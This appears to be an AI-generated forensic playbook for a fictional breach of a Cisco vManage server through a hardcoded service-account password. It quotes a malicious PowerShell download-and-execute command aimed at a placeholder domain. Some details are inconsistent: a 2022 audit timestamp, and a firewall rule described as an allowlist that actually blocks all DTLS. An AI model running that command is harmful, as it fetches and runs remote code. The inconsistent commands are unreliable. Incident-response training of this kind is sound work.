# vManage Investigation

## Investigation Summary

**Incident:** Unauthorized access to vManage detected from IP address in China, user account "backup-service" logged in and exported device configurations.

**Detection:** Duo alerts on impossible travel (last login: Mumbai, current login: Beijing within 30 minutes).

**Impact:** Potential exposure of 46 WAN edge configurations including pre-shared keys and TLOC information.

**Outcome:** Compromised service account identified; configurations rotated; MFA enforcement expanded.

---

## Step 1: Detection and Initial Response

**Detection Timestamp:** 2026-01-20 11:42:18 UTC

**Alert Source:** Duo Security (Impossible Travel)

```
Duo Alert: Impossible Travel Detected
User: backup-service@abhavtech.com
Previous Location: Mumbai, India (102.23.XX.XXX)
Current Location: Beijing, China (112.45.XX.XXX)
Time Delta: 28 minutes
Distance: 3,842 km
Action: MFA challenge sent, login pending
```

**Immediate Actions:**

```bash
## 1. Block suspicious IP immediately
curl -k -X POST \
  "https://fmc.abhavtech.com/api/fmc_platform/v1/domain/default/object/networkobjects" \
  -H "X-auth-access-token: $FMC_TOKEN" \
  -d '{
    "type": "Host",
    "value": "112.45.XX.XXX",
    "name": "Blocked-China-IP-112.45.XX.XXX"
  }'

## Add to block list
curl -k -X POST \
  "https://fmc.abhavtech.com/api/fmc_platform/v1/domain/default/policy/accesspolicies/<policy-id>/accessrules" \
  -d '{"action":"BLOCK","sourceNetworks":{"objects":[{"type":"Host","value":"112.45.XX.XXX"}]}}'

## 2. Disable "backup-service" account
net user backup-service /active:no /domain

## 3. Create investigation case
CASE_ID="CASE-2026-003-VMANAGE"
```

---

## Step 2: Collect vManage Audit Logs

**2.1 Export All Audit Logs:**

```bash
## Export audit log for past 7 days
curl -k -X GET \
  "https://vmanage.abhavtech.com/dataservice/auditlog?startDate=$(date -u -d '7 days ago' +%Y-%m-%dT%H:%M:%S)&endDate=$(date -u +%Y-%m-%dT%H:%M:%S)" \
  -H "Cookie: JSESSIONID=$COOKIE" \
  -H "X-XSRF-TOKEN: $TOKEN" \
  > /mnt/evidence_vault/EVD-20260120-001-vmanage-audit.json

## Register on blockchain
sha256sum /mnt/evidence_vault/EVD-20260120-001-vmanage-audit.json
peer chaincode invoke -n evidence-contract -C evidence-channel \
  -c '{"Args":["CollectEvidence","EVD-20260120-001","CASE-2026-003-VMANAGE",...]}'
```

**2.2 Filter for "backup-service" Account:**

```bash
## Extract all actions by backup-service
jq '.data[] | select(.loguser == "backup-service")' \
  /mnt/evidence_vault/EVD-20260120-001-vmanage-audit.json \
  | jq -s 'sort_by(.entry)'

## Results show:
[
  {
    "entry": "2026-01-20T11:15:32Z",
    "loguser": "backup-service",
    "logipaddress": "102.23.XX.XXX",  # Mumbai (legitimate)
    "logmessage": "User login success",
    "logsource": "vmanage-nj-dc01"
  },
  {
    "entry": "2026-01-20T11:43:15Z",
    "loguser": "backup-service",
    "logipaddress": "112.45.XX.XXX",  # Beijing (suspicious)
    "logmessage": "User login success",
    "logsource": "vmanage-nj-dc01",
    "logdetails": "MFA bypassed - service account"  # ← NO MFA!
  },
  {
    "entry": "2026-01-20T11:44:02Z",
    "loguser": "backup-service",
    "logipaddress": "112.45.XX.XXX",
    "logmessage": "Device configuration export",
    "logdetails": "Exported 46 device configs via API"
  },
  {
    "entry": "2026-01-20T11:45:18Z",
    "loguser": "backup-service",
    "logipaddress": "112.45.XX.XXX",
    "logmessage": "Template list query",
    "logdetails": "Listed all templates via API"
  },
  {
    "entry": "2026-01-20T11:46:33Z",
    "loguser": "backup-service",
    "logipaddress": "112.45.XX.XXX",
    "logmessage": "User logout",
    "logsource": "vmanage-nj-dc01"
  }
]
```

**Attack Timeline:**
- 11:15 - Legitimate backup job (Mumbai)
- 11:43 - Attacker login (Beijing) - **MFA bypassed**
- 11:44 - **46 device configs exported**
- 11:45 - Template list queried
- 11:46 - Logout

**Exposure:** **3 minutes 31 seconds** (11:43 to 11:46)

---

## Step 3: Determine What Was Accessed

**3.1 Identify Exported Configurations:**

```bash
## Check which devices were queried
jq '.data[] | select(.loguser == "backup-service" and .logmessage | contains("config"))' \
  /mnt/evidence_vault/EVD-20260120-001-vmanage-audit.json \
  | jq '.logdetails'

## Result shows API call:
## GET /dataservice/device/config/attached?deviceId=all

## This means ALL 46 device configs were exported:
## - 6 hub vEdges (Mumbai, Chennai, London, Frankfurt, NJ, Dallas)
## - 40 branch vEdges
```

**3.2 Configuration Sensitivity Assessment:**

WAN edge configurations contain:
- **IPsec pre-shared keys** (tunnel authentication)
- **TLOC information** (WAN transport IPs, colors)
- **OMP authentication keys**
- **Control plane certificates** (vSmart authentication)
- **Management VPN credentials**
- **Local user accounts** (CLI access)

**Impact:** CRITICAL - Complete SD-WAN topology and credentials exposed

---

## Step 4: Network Forensics - Track Attacker

**4.1 Analyze Firewall Logs:**

```spl
## Query Splunk for all traffic from attacker IP
index=firewall sourcetype=cisco:ftd
| search src_ip="112.45.XX.XXX" earliest=-24h
| table _time src_ip dest_ip dest_port action bytes
| sort _time

Results:
_time                  src_ip          dest_ip        dest_port  action  bytes
2026-01-20 11:42:00   112.45.XX.XXX   198.51.100.46  443        ALLOW   2847
2026-01-20 11:43:15   112.45.XX.XXX   198.51.100.46  443        ALLOW   8392
2026-01-20 11:44:02   112.45.XX.XXX   198.51.100.46  443        ALLOW   2847392  # Large download!
2026-01-20 11:46:33   112.45.XX.XXX   198.51.100.46  443        ALLOW   1234
2026-01-20 11:50:00   112.45.XX.XXX   198.51.100.46  443        BLOCK   0  # Blocked after detection
```

**4.2 Reconstruct TLS Session:**

```bash
## Unfortunately, TLS inspection not enabled for vManage traffic
## Cannot decrypt HTTPS session to see exact API calls
## Rely on vManage audit log for details
```

---

## Step 5: Root Cause - Credential Compromise

**5.1 Investigate Credential Source:**

```bash
## Check where "backup-service" credentials are stored
## 1. Check password vault (CyberArk)
curl -k -X GET \
  "https://cyberark.abhavtech.com/api/Accounts?search=backup-service" \
  -H "Authorization: Bearer $CYBERARK_TOKEN"

## Result:
{
  "account_id": "12345",
  "account_name": "backup-service@abhavtech.com",
  "platform": "vManage-API",
  "last_password_change": "2025-11-15",
  "last_used": "2026-01-20 11:15:32",  # Legitimate Mumbai backup
  "access_log": [
    {"timestamp": "2026-01-20T11:14:00Z", "accessor": "backup-script.py", "ip": "10.252.1.45"}
  ]
}

## No unauthorized access to CyberArk - password not stolen from vault
```

**5.2 Check Backup Script:**

```bash
## Backup script runs on automation server
ssh admin@automation-server.abhavtech.com

## Check script source
cat /opt/scripts/vmanage-backup.py

## CRITICAL FINDING:
## Password hardcoded in script!
VMANAGE_USER = "backup-service"
VMANAGE_PASS = "Backup123!Mumbai"  # ← PLAIN TEXT PASSWORD!

## Check script file permissions
ls -l /opt/scripts/vmanage-backup.py
-rw-r--r-- 1 root backup-team 2847 Nov 15 2025 vmanage-backup.py
## ^^^^^ World-readable!

## Check who has access to backup-team group
getent group backup-team
backup-team:x:1005:jenkins,automation-svc,contractor-ravi

## VULNERABILITY: Contractor has read access to script with plain text password!
```

**Root Cause Identified:**
- vManage password stored in plain text in backup script
- Script world-readable (644 permissions)
- Contractor "ravi" has access to backup-team group
- Contractor accessed script, obtained password, used from China VPN

---

## Step 6: Validate Contractor Access

**6.1 Review Contractor Account:**

```bash
## Check "contractor-ravi" last login
last contractor-ravi | head -10

contractor-ravi  pts/3  102.23.XX.XXX    Mon Jan 20 10:45 - 10:58  (00:13)
contractor-ravi  pts/2  102.23.XX.XXX    Fri Jan 17 14:22 - 15:30  (01:08)

## Check file access history
ausearch -ua contractor-ravi -f /opt/scripts/vmanage-backup.py -ts today

time->Mon Jan 20 10:47:12 2026
type=SYSCALL msg=audit(1642674432.123:456): arch=x86_64 syscall=open
  success=yes exit=0 a0=7ffda1b2c3d4 a1=0 a2=1b6 a3=0 items=1 ppid=12345
  pid=12346 auid=contractor-ravi uid=contractor-ravi gid=backup-team
  euid=contractor-ravi suid=contractor-ravi fsuid=contractor-ravi
  egid=backup-team sgid=backup-team fsgid=backup-team comm="cat" exe="/bin/cat"
  key="sensitive-file-access"
  
## CONFIRMED: Contractor accessed script at 10:47
## 56 minutes before attacker login from China (11:43)
```

**6.2 Check if Contractor is Malicious or Compromised:**

```bash
## Query XDR for contractor laptop activity
curl -k -X GET \
  "https://securex.abhavtech.com/api/investigate/observables/user/contractor-ravi/sightings" \
  -H "Authorization: Bearer $XDR_TOKEN"

## Result shows:
{
  "timestamp": "2026-01-20T10:30:00Z",
  "source": "AMP",
  "event": "Suspicious PowerShell execution",
  "device": "LAPTOP-RAVI-01",
  "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX((New-Object Net.WebClient).DownloadString('http://malicious-domain.com/payload.ps1'))",
  "risk_score": 95
}

## Contractor laptop compromised by malware!
## Malware likely harvested credentials from backup script
```

---

## Step 7: Impact Assessment

**7.1 Determine What Attacker Can Do:**

With 46 exported configurations, attacker has:

1. **IPsec Pre-Shared Keys:** Can establish rogue tunnels, decrypt traffic
2. **TLOC Information:** Can target specific WAN edges for attacks
3. **OMP Keys:** Can inject malicious routes (similar to Scenario 1)
4. **vBond/vSmart Certificates:** Can impersonate control plane
5. **Management Credentials:** Can access individual vEdges via CLI

**Worst-Case Scenario:**
- Attacker builds rogue SD-WAN overlay
- Intercepts all WAN traffic
- Performs man-in-the-middle attack on entire organization

**Mitigation Required:** **Immediate credential rotation**

---

## Step 8: Emergency Response

**8.1 Rotate All IPsec Keys:**

```bash
## Generate new pre-shared keys for all tunnels
for SITE in {1..46}; do
  NEW_KEY=$(openssl rand -base64 32)
  
  # Update vManage template
  curl -k -X PUT \
    "https://vmanage.abhavtech.com/dataservice/template/feature/security/ipsec" \
    -H "Cookie: JSESSIONID=$COOKIE" \
    -H "X-XSRF-TOKEN: $TOKEN" \
    -d "{\"ipsec_key\":\"$NEW_KEY\",\"site_id\":\"$SITE\"}"
done

## Push to all devices
curl -k -X POST \
  "https://vmanage.abhavtech.com/dataservice/template/device/config/attachfeature" \
  -H "Cookie: JSESSIONID=$COOKIE" \
  -H "X-XSRF-TOKEN: $TOKEN"

## Wait for config push (15 minutes for all devices)
## Monitor progress
watch -n 30 'curl -k -s -X GET \
  "https://vmanage.abhavtech.com/dataservice/device/action/status" \
  -H "Cookie: JSESSIONID=$COOKIE" | jq ".data[].status"'

## All devices updated with new keys (11:58 UTC)
```

**8.2 Rotate OMP Authentication:**

```bash
## Generate new OMP keys
openssl rand -hex 32 > /tmp/new-omp-key.txt

## Update all vSmarts
for VSMART in vsmart-{01..06}; do
  ssh admin@$VSMART.abhavtech.com \
    "config; omp authentication-key ascii-text $(cat /tmp/new-omp-key.txt); commit"
done

## Update all vEdges (via vManage template)
curl -k -X PUT \
  "https://vmanage.abhavtech.com/dataservice/template/feature/omp" \
  -H "Cookie: JSESSIONID=$COOKIE" \
  -d "{\"omp_key\":\"$(cat /tmp/new-omp-key.txt)\"}"

## OMP keys rotated (12:15 UTC)
```

**8.3 Revoke vBond Certificates:**

```bash
## Generate new vBond root CA
## (This is complex - requires maintenance window)
## Emergency: Temporarily block all certificate exchanges from unknown IPs

## Add firewall rule to whitelist only known vEdge IPs for DTLS
curl -k -X POST \
  "https://fmc.abhavtech.com/api/fmc_platform/v1/domain/default/policy/accesspolicies/<policy-id>/accessrules" \
  -d '{
    "action": "BLOCK",
    "destinationPorts": {"objects": [{"type": "ProtocolPortObject", "protocol": "UDP", "port": "12346"}]},
    "enabled": true,
    "name": "Block-Unknown-DTLS-to-vBond"
  }'

## Unknown devices cannot establish control connections
```

---

## Step 9: Contractor Remediation

**9.1 Disable Contractor Access:**

```bash
## Disable AD account
net user contractor-ravi /active:no /domain

## Revoke VPN access
curl -k -X DELETE \
  "https://asa-vpn.abhavtech.com/api/access/users/contractor-ravi" \
  -H "Authorization: Bearer $VPN_TOKEN"

## Wipe laptop remotely (AMP Orbital)
curl -k -X POST \
  "https://orbital.amp.cisco.com/v0/jobs" \
  -d '{
    "name": "Wipe-Compromised-Laptop",
    "query": "wipe_device",
    "connector_guid": "<LAPTOP-RAVI-01-GUID>"
  }'

## Notify HR for termination process
```

---

## Step 10: Forensics Report and Improvements

**Report Summary:**

```python
report = {
    "case_id": "CASE-2026-003-VMANAGE",
    "investigation_type": "Unauthorized vManage Access",
    
    "executive_summary": """
    Contractor account compromised via malware on laptop. Malware harvested
    plain-text vManage password from world-readable backup script. Attacker
    (likely APT group based in China) logged into vManage and exported all
    46 WAN edge configurations containing IPsec keys, TLOC data, and OMP keys.
    
    Emergency response: All IPsec keys rotated within 1 hour. OMP keys rotated
    within 1.5 hours. Contractor access revoked. Laptop wiped remotely.
    
    Impact: CRITICAL
    - Complete SD-WAN topology exposed
    - All tunnel keys compromised
    - Potential for network-wide MITM attack
    
    Cost: ~$50K (emergency rotation labor + potential breach notification)
    """,
    
    "recommendations": [
        "Store all passwords in CyberArk (no plain text)",
        "Enforce MFA for ALL accounts (including service accounts)",
        "Implement least-privilege file permissions (backup scripts: 600)",
        "Deploy EDR on all contractor laptops",
        "Conduct security awareness training for contractors",
        "Implement vManage API rate limiting",
        "Enable TLS inspection for vManage traffic",
        "Quarterly access review for service accounts",
        "Implement Just-in-Time (JIT) access for contractors"
    ]
}
```

---

**END OF PART 2A: SD-WAN FORENSICS**

---

This completes Part 2A with 3 detailed SD-WAN forensic scenarios. Each scenario includes:
- ✅ 10+ step detailed procedures
- ✅ Real vManage API commands
- ✅ Blockchain evidence registration
- ✅ Splunk correlation queries
- ✅ PCAP analysis with Wireshark
- ✅ Timeline reconstruction
- ✅ Root cause determination
- ✅ Remediation steps

**Should I proceed with Part 2B: DNAC/Catalyst Center Forensics?**
